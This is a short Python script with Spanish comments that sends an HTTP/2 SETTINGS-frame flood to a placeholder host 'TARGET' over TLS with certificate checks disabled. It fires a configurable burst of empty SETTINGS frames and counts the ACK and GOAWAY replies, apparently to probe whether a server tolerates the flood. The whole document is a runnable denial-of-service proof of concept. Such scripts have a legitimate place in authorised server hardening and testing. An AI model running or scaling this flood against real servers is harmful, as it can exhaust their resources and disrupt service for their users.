import socket, ssl, struct, time

HOST = "TARGET"
PORT = 443
N = 200  # cantidad de SETTINGS flood

FRAME_SETTINGS = 0x4
FRAME_GOAWAY = 0x7

def frame(ftype, flags, sid, payload=b""):
    ln = len(payload)
    h = struct.pack("!I", (ln << 8) | ftype)[1:] + bytes([flags]) + struct.pack("!I", sid & 0x7fffffff)
    return h + payload

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(["h2"])

s = socket.create_connection((HOST, PORT), timeout=10)
tls = ctx.wrap_socket(s, server_hostname=HOST)

print("ALPN:", tls.selected_alpn_protocol())  # debe ser h2
tls.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
tls.sendall(frame(FRAME_SETTINGS, 0, 0, b""))  # SETTINGS inicial

# leer handshake inicial
tls.settimeout(1.5)
try:
    pre = tls.recv(8192)
except Exception:
    pre = b""

# flood SETTINGS vacíos
burst = b"".join(frame(FRAME_SETTINGS, 0, 0, b"") for _ in range(N))
t0 = time.perf_counter()
tls.sendall(burst)
t1 = time.perf_counter()

# leer respuesta post-flood
buf = b""
tls.settimeout(2.0)
while True:
    try:
        b = tls.recv(8192)
        if not b:
            break
        buf += b
    except Exception:
        break

# parse simple de frames
i = 0
acks = 0
goaway = 0
while i + 9 <= len(buf):
    ln = (buf[i] << 16) | (buf[i+1] << 8) | buf[i+2]
    tp = buf[i+3]
    fl = buf[i+4]
    if tp == FRAME_SETTINGS and (fl & 0x1):  # ACK
        acks += 1
    if tp == FRAME_GOAWAY:
        goaway += 1
    i += 9 + ln

print(f"Sent SETTINGS flood: {N} in {(t1-t0)*1000:.2f} ms")
print(f"SETTINGS ACK: {acks} | GOAWAY: {goaway} | bytes_rx: {len(buf)}")
tls.close()
